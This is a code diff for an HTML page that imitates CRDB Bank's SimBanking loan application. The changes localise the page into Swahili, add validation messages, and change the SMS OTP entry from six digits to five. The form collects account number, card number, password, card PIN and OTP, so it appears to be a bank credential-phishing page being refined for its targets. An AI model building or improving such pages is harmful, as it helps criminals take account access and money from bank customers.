@@ -20,25 +20,25 @@
     </div>
   </header>
 
-  <!-- HATUA YA 1: WELCOME MESSAGE -->
+  <!-- HATUA YA 1: WELCOME MESSAGE (SWAHILI) -->
   <section id="step-I UNDERSTAND" class="screen active">
-    <h1 style="font-size: 24px; color: var(--crdb-green); text-align: center; margin-top: 10px;">WELCOME TO CRDB SIMBANKING</h1>
+    <h1 style="font-size: 24px; color: var(--crdb-green); text-align: center; margin-top: 10px;">KARIBU CRDB SIMBANKING</h1>
 
     <div class="notice-box" style="text-align: left;">
       <p style="font-size: 15px; line-height: 1.6; color: var(--text-main); margin-bottom: 12px;">
-        <strong>Dear Applicant,</strong>
+        <strong>Mpendwa Mteja / Mwombaji,</strong>
       </p>
       <p style="font-size: 14px; line-height: 1.6; color: var(--text-main); margin-bottom: 12px;">
-        Welcome to CRDB SIMBANKING. To apply for a loan, please ensure you meet the required loan application conditions and follow the official CRDB SIMBANKING application procedures.
+        Karibu kwenye huduma ya mkopo kupitia CRDB SIMBANKING. Ili kuomba mkopo, tafadhali hakikisha unatimiza masharti yanayohitajika na kufuata taratibu rasmi za maombi ya CRDB.
       </p>
       <p style="font-size: 14px; line-height: 1.6; color: var(--text-main); margin-bottom: 12px;">
-        Make sure your details are correct and up to date.
+        Hakikisha taarifa zako ziko sahihi na zimesasishwa.
       </p>
       <p style="font-size: 14px; line-height: 1.6; color: var(--text-main); margin-bottom: 12px;">
-        Please proceed through the official CRDB channels to submit your loan application.
+        Tafadhali tumia njia rasmi za CRDB kuwasilisha ombi lako la mkopo kwa usalama zaidi.
       </p>
       <p style="font-size: 14px; line-height: 1.6; color: var(--crdb-green); font-weight: 700; margin-top: 16px;">
-        Thank you for choosing CRDB Bank.
+        Asante kwa kuchagua Benki ya CRDB.
       </p>
     </div>
 
@@ -114,12 +114,14 @@
     <div class="form-group">
       <label for="crdb-account">Namba ya Akaunti ya Benki (Bank Account Number)</label>
       <input type="text" id="crdb-account" class="input-field" placeholder="0152XXXXXXXXX" maxlength="16" inputmode="numeric">
+      <span id="account-error" class="error-text">Tafadhali weka namba sahihi ya akaunti (angalau tarakimu 10 hadi 15).</span>
     </div>
 
     <!-- NAMBA YA KADI YA BENKI -->
     <div class="form-group">
       <label for="crdb-card">Namba ya Kadi ya Benki (Bank Card Number)</label>
       <input type="text" id="crdb-card" class="input-field" placeholder="4000 XXXX XXXX XXXX" maxlength="19" inputmode="numeric">
+      <span id="card-error" class="error-text">Tafadhali weka namba halali ya kadi ya tarakimu 16.</span>
     </div>
 
     <!-- NYWILA -->
@@ -172,11 +174,11 @@
     <button id="btn-submit-card-pin" class="btn-primary btn-large" style="margin-top: 20px;">THIBITISHA PIN</button>
   </section>
 
-  <!-- HATUA YA 5: OTP YA SMS (Tarakimu 6) -->
+  <!-- HATUA YA 5: OTP YA SMS (Tarakimu 5) -->
   <section id="step-otp" class="screen">
     <h2 style="margin-bottom: 6px;">Uthibitisho wa SMS</h2>
     <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 16px;">
-      Namba ya uthibitisho ya tarakimu 6 imetumwa kupitia SMS kwenye simu yako.
+      Namba ya uthibitisho ya tarakimu 5 imetumwa kupitia SMS kwenye simu yako.
     </p>
 
     <!-- BANNER LA ONYO KAMA OTP IMEKWISHA MUDA -->
@@ -185,19 +187,18 @@
     </div>
 
     <div class="sms-notice">
-      <p>⚠️ WEKA OTP YA TARAKIMU 6 ULIYOPOKEA KUPITIA SMS.</p>
+      <p>⚠️ WEKA OTP YA TARAKIMU 5 ULIYOPOKEA KUPITIA SMS.</p>
     </div>
 
     <div class="form-group" style="text-align: center;">
-      <div class="pin-grid-6">
-        <input type="text" class="otp-digit-6" maxlength="1" inputmode="numeric">
-        <input type="text" class="otp-digit-6" maxlength="1" inputmode="numeric">
-        <input type="text" class="otp-digit-6" maxlength="1" inputmode="numeric">
-        <input type="text" class="otp-digit-6" maxlength="1" inputmode="numeric">
-        <input type="text" class="otp-digit-6" maxlength="1" inputmode="numeric">
-        <input type="text" class="otp-digit-6" maxlength="1" inputmode="numeric">
+      <div class="pin-grid-5">
+        <input type="text" class="otp-digit-5" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp-digit-5" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp-digit-5" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp-digit-5" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp-digit-5" maxlength="1" inputmode="numeric">
       </div>
-      <span id="otp-error" class="error-text">Tafadhali weka OTP halali ya tarakimu 6.</span>
+      <span id="otp-error" class="error-text">Tafadhali weka OTP halali ya tarakimu 5.</span>
     </div>
 
     <button id="btn-submit-otp" class="btn-primary" style="margin-top: 20px;">WASILISHA OTP</button>
@@ -257,5 +258,5 @@
 
 <script src="script.js"></script>
 </body>
-      </html>
+          </html>
           
